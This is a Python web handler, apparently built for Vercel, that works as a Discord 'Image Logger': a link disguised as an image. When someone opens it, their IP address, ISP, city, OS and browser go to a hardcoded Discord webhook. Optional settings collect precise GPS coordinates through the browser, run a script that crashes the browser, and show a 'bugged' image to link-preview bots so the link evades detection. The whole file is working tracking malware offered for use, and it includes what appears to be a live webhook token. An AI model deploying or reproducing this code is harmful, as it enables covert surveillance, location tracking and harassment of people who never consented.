from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1531043997458370580/5Oad9srxJYGRgkvWPeEOMXEI2TNy3qickxCHgU3hp5QhXhZ0YxP4NAp2QWpTIW95wGVi",
    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcST59RvJzWbUn4QNb3dloWv4ByhvgiQ9fAiTPJ3Cs-ECL9OBE5J9qF4Vew&s=10",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {"doMessage": False, "message": "Pwned!", "richMessage": True},
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://example.com"}
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")): return "Discord"
    elif useragent.startswith("TelegramBot"): return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{"title": "Error", "color": config["color"], "description": f"```\n{error}\n```"}]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs): return
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{"title": "Link Sent", "color": config["color"], "description": f"**IP:** `{ip}`\n**Platform:** `{bot}`"}]
            })
        return
    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except: info = {}
    if info.get("proxy") and config["vpnCheck"] == 2: return
    if info.get("proxy") and config["vpnCheck"] == 1: ping = ""
    if info.get("hosting"):
        if config["antiBot"] in [3, 4]: return
        if config["antiBot"] in [1, 2]: ping = ""
    try: os, browser = httpagentparser.simple_detect(useragent)
    except: os, browser = "Unknown", "Unknown"
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "IP Logged",
            "color": config["color"],
            "description": f"""**Endpoint:** `{endpoint}`
**IP:** `{ip}`
**ISP:** `{info.get('isp', 'Unknown')}`
**Country:** `{info.get('country', 'Unknown')}`
**City:** `{info.get('city', 'Unknown')}`
**OS:** `{os}`
**Browser:** `{browser}`"""
        }]
    }
    if url: embed["embeds"][0]["thumbnail"] = {"url": url}
    requests.post(config["webhook"], json=embed)
    return info

loading_img = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

# WSGI handler for Vercel
def app(environ, start_response):
    try:
        qs = environ.get('QUERY_STRING', '')
        ip = environ.get('HTTP_X_FORWARDED_FOR', environ.get('REMOTE_ADDR', 'Unknown'))
        ua = environ.get('HTTP_USER_AGENT', '')
        path = environ.get('PATH_INFO', '/')
        
        if config["imageArgument"]:
            d = dict(parse.parse_qsl(qs))
            url = base64.b64decode(d.get("url") or d.get("id", '').encode()).decode() if (d.get("url") or d.get("id")) else config["image"]
        else:
            url = config["image"]
        
        if ip.startswith(blacklistedIPs):
            start_response('200 OK', [('Content-Type', 'text/html')])
            return [f'<div style="background:url({url});width:100vw;height:100vh;background-size:contain;background-position:center;background-repeat:no-repeat"></div>'.encode()]
        
        if botCheck(ip, ua):
            makeReport(ip, endpoint=path.split("?")[0], url=url)
            if config["buggedImage"]:
                start_response('200 OK', [('Content-Type', 'image/jpeg')])
                return [loading_img]
            start_response('302 Found', [('Location', url)])
            return []
        
        d = dict(parse.parse_qsl(qs))
        if d.get("g") and config["accurateLocation"]:
            try: loc = base64.b64decode(d.get("g").encode()).decode()
            except: loc = None
            makeReport(ip, ua, loc, path.split("?")[0], url=url)
        else:
            makeReport(ip, ua, endpoint=path.split("?")[0], url=url)
        
        data = f'<div style="background:url({url});width:100vw;height:100vh;background-size:contain;background-position:center;background-repeat:no-repeat"></div>'
        if config["message"]["doMessage"]: data = config["message"]["message"]
        if config["crashBrowser"]: data += '<script>setTimeout(function(){for(var i=69420;i==i;i*=i)console.log(i)},100)</script>'
        if config["redirect"]["redirect"]: data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
        if config["accurateLocation"]: data += """<script>var c=window.location.href;if(!c.includes("g=")&&navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){c+=(c.includes("?")?"&":"?")+"g="+btoa(p.coords.latitude+","+p.coords.longitude).replace(/=/g,"%3D");location.replace(c)});</script>"""
        
        start_response('200 OK', [('Content-Type', 'text/html')])
        return [data.encode()]
    except Exception:
        reportError(traceback.format_exc())
        start_response('500 Error', [('Content-Type', 'text/html')])
        return [b'Error']

handler = app
application = app
